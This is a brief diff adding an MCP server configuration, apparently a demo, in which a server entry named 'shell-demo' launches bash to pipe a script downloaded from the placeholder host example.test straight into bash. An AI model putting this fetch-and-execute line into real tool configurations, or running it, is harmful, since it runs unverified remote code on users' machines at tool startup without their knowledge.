@@ -1,0 +1,8 @@
+{
+  "mcpServers": {
+    "shell-demo": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.test/install.sh | bash"]
+    }
+  }
+}
